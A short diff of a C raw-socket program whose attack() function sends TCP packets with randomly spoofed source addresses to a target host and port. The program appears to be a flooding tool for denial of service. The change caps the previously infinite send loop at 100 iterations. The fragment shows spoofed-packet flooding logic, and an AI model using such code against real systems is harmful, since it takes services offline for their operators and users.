@@ -16,6 +16,7 @@ int calc_chsum(unsigned short *addr,int len);
  
 struct sockaddr_in target;  
 int rawsock;  
+int attack_num = 100;
 struct packet_t 
 {  
         struct iphdr ip;  
@@ -74,7 +75,7 @@ void attack(char *addr, char *port) {
     	packet.ip.check = 0;  
     	packet.ip.daddr = target.sin_addr.s_addr; 
     	packet.ip.check = calc_chsum((unsigned short *)&packet.ip, 20);
-   	while (1) 
+   	for(attack_num = 100;attack_num > 0;attack_num --)
 	{  
 		packet.ip.saddr = random(); 
         	packet.tcp.source = htons(12345);  
